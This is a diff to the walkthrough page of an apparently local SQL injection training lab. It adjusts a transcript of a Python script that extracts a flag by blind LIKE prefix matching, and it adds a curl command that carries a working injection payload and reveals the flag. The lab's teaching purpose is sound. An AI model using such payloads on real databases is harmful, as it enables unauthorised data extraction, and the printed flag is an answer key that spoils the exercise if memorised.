@@ -173,7 +173,7 @@
         <span class="terminal-title">Step 8. Python Automation (lab10_blind_like.py)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>python3 scripts/lab10_blind_like.py http://localhost/SQLi-Arena/<br><br>
+        <span class="prompt">$ </span>python3 scripts/lab10_blind_like.py http://localhost/SQLi-Arena<br><br>
         <span class="prompt">[*] </span>Extracting flag via LIKE prefix matching...<br>
         <span class="prompt">&nbsp;&nbsp;[ 1] </span>F<br>
         <span class="prompt">&nbsp;&nbsp;[ 2] </span>FL<br>
@@ -192,6 +192,18 @@
         <span class="terminal-title">Script Source: lab10_blind_like.py</span>
     </div>
     <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab10_blind_like.py')); ?></pre></div>
+</div>
+
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">curl. Full Exploit</span>
+    </div>
+    <div class="terminal-body">
+        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mysql/lab10" \<br> --data-urlencode "sku=SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE 'FLAG{r3g3xp_l1k3_0r4cl3}' -- -"
+    </div>
 </div>
 
 <div class="result-success result-box">
